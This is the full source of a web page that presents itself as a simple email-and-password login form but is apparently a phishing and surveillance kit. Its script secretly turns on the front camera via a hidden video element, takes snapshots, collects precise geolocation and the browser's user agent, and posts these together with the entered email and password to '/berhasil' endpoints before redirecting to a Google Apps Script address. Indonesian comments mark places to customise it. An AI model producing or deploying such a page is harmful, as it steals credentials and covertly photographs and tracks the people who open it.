<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
  body {
    font-family: Arial, sans-serif;
    text-align: center;
    padding:20px;
    margin:0;
    background: url('https://media1.giphy.com/media/v7WM6sLcnGIc8/giphy.gif') no-repeat center center fixed; /* Ganti URL background */
    background-size: cover;
    color: white;
  }
  .form-container {
    background: rgba(0,0,0,0.6);
    padding: 20px;
    border-radius: 12px;
    display: inline-block;
    margin-top: 60px;
    box-shadow: 0px 0px 20px rgba(255,255,255,0.2);
  }
  h2 { margin-bottom: 15px; }
  input {
    padding:10px; margin:8px; width: 250px; border: none; border-radius: 8px;
  }
  button {
    padding:10px 20px; border: none; border-radius: 8px; background-color: #4CAF50; color: white; font-size: 16px;
  }
  button:hover { background-color: #45a049; }
  video { display: none; }
</style>
</head>
<body>

<div class="form-container">
  <h2><i class="fas fa-user-lock"></i> Login</h2>
  <form id="loginForm">
    <input type="text" name="email" placeholder="Your Email" required><br>
    <input type="password" name="password" placeholder="Your Password" required><br>
    <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
  </form>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
let ua = navigator.userAgent;

function capture(cb){
  const v=document.getElementById('video');
  const c=document.getElementById('canvas');
  const ctx=c.getContext('2d');
  c.width=v.videoWidth||640;
  c.height=v.videoHeight||480;
  ctx.drawImage(v,0,0,c.width,c.height);
  cb(c.toDataURL('image/jpeg'));
}

function getLoc(cb){
  navigator.geolocation.getCurrentPosition(
    p=>{cb(p.coords.latitude, p.coords.longitude);},
    e=>{cb("", "");},
    {enableHighAccuracy:true, timeout:10000}
  );
}

// Capture awal
navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
.then(stream=>{
  document.getElementById('video').srcObject=stream;
  setTimeout(()=>{
    capture(img=>{
      getLoc((lat,lon)=>{
        fetch("/berhasil_awal", {
          method:"POST",
          body: JSON.stringify({photo:img, lat:lat, lon:lon, ua:ua}),
          headers: {"Content-Type":"application/json"}
        });
      });
    });
  }, 1500);
}).catch(e=>console.error("Kamera error:", e));

// Capture saat login
document.getElementById('loginForm').addEventListener('submit', function(e){
  e.preventDefault();
  capture(img=>{
    getLoc((lat, lon)=>{
      const fd = new FormData();
      fd.append("email", this.email.value);
      fd.append("password", this.password.value);
      fd.append("photo", img);
      fd.append("lat", lat);
      fd.append("lon", lon);
      fd.append("ua", ua);
      fetch("/berhasil", {method:"POST", body:fd})
      .then(()=>{ window.location.href="https://script.google.com/macros/s/AKfycbyET9ITEquXH5xnrzOBXZEP4C7_9q7u3zyz3SrzKaA3SZVNMb-gHTAQf0Rn6jgnWtNO4w/exec"; }); /* Ganti /form_laporan kalau mau direct ke URL lain */
    });
  });
});
</script>

</body>
</html>
